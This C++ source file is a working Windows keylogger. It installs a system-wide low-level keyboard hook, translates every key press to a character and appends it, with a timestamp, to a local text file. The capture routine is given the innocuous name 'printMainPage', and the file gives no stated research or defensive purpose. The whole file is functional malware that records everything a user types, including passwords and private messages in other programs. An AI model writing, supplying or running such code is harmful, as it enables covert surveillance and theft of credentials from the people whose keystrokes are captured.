#include <bits/stdc++.h>
#include <windows.h>
#include <conio.h>

using namespace std;

string fileName = "fileSave.txt";

HHOOK hHook;


string vkToChar(DWORD vkCode, DWORD scanCode) {
    BYTE keyState[256];
    if (!GetKeyboardState(keyState))
        return "";

    wchar_t buff[5];
    int len = ToUnicode(vkCode, scanCode, keyState, buff, 4, 0);
    if (len > 0)
        return string(1, (char)buff[0]);
    return "";
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *) lParam;
        if (wParam == WM_KEYDOWN) {
            string ch = vkToChar(kb->vkCode, kb->scanCode);

            if (!ch.empty()) {
                ofstream fout(fileName, ios::app);
                if (fout.is_open()) {
                    fout << ch;
                }
                fout.close();
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void printMainPage() {

    SYSTEMTIME st;
    GetLocalTime(&st);

    ofstream fout(fileName, ios::app);

    if (!fout.is_open()) {
        cerr << "Can't open file " << fileName << endl;
    }

    fout << st.wDay << "_" << st.wMonth << "_" << st.wYear << "_" << st.wHour << "_" << st.wMinute << "_" << st.
            wSecond
            << endl;

    fout.close();

    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
}

int main() {
    printMainPage();

    return 0;
}
